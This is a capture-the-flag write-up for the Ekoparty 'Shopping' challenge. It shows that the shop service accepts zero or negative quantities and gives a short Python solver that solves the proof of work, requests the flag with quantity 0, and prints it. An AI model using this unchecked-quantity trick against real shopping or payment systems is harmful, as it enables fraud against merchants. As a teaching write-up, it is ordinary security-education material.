# Shopping (Pwn, 352p, 90 solved)

A bit of an overstatement to call this `pwn`.
After passing some PoW we get access to a black-box shopping service:

```
Welcome to Ekoparty shopping Center
Feel free to buy up to 5 items that you may like
Use wisely your coins, have fun!


You have 50 coins
What do you wanna buy today?
1. t-shirt		10
2. short		20
3. stickers		1
4. flag			?
```

If we select an item and quantity it will subtract `price*quantity` from our coins if we had enough.
The trick here is to notice that we can pass 0 or even negative numbers as quantity, and the application doesn't check it.
If we pass a negative number it will give us coins.
But we don't even need that much, we can just buy 0 or -1 flags and it will be enough.

We run:

```python
import hashlib
import re

import os

from crypto_commons.netcat.netcat_commons import nc, send, interactive


def PoW(task):
    while True:
        data = os.urandom(10)
        if hashlib.sha1(data).hexdigest()[0:6] == task:
            return data


def main():
    url = "shopping.ctf.site"
    port = 21111
    s = nc(url, port)
    data = s.recv(9999)
    task = re.findall("== (.*)", data)[0]
    send(s, PoW(task))
    print(s.recv(9999))
    send(s, "4")
    print(s.recv(9999))
    send(s, "0")
    print(s.recv(9999))
    interactive(s)


main()
```

and we get `EKO{d0_y0u_even_m4th?}`
